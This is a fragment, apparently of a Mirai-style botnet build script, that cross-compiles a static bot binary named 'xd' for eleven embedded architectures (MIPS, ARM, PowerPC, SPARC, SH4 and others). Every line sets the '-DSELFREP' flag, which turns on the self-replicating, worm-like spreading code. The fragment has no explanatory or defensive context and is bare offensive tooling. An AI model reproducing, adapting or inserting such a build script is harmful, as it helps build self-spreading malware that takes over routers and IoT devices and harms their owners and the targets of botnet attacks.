...
compile_bot i586 xd.x86 "-static -DSELFREP"
compile_bot mips xd.mips "-static -DSELFREP"
compile_bot mipsel xd.mpsl "-static -DSELFREP"
compile_bot armv4l xd.arm "-static -DSELFREP"
compile_bot armv5l xd.arm5 "-static -DSELFREP"
compile_bot armv6l xd.arm6 "-static -DSELFREP"
compile_bot armv7l xd.arm7 "-static -DSELFREP"
compile_bot powerpc xd.ppc "-static -DSELFREP"
compile_bot sparc xd.spc "-static -DSELFREP"
compile_bot m68k xd.m68k "-static -DSELFREP"
compile_bot sh4 xd.sh4 "-static -DSELFREP"
